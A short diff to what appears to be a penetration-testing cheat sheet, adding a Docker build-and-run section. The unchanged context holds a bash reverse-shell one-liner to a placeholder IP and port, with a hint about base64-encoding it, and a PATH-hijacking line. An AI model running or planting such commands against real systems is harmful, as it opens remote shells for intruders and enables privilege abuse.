@@ -37,3 +37,9 @@ echo "bash -i >& /dev/tcp/[IP_ADDR]/[PORT] 0>&1" |bash    # base64 encode the ec
 ```
 export PATH=/tmp:$PATH
 ```
+
+### Docker
+```
+docker build -t [image-name] [Dockerfile location]    # building a docker image from the image file
+docker run [image-name]   # running the docker image
+```
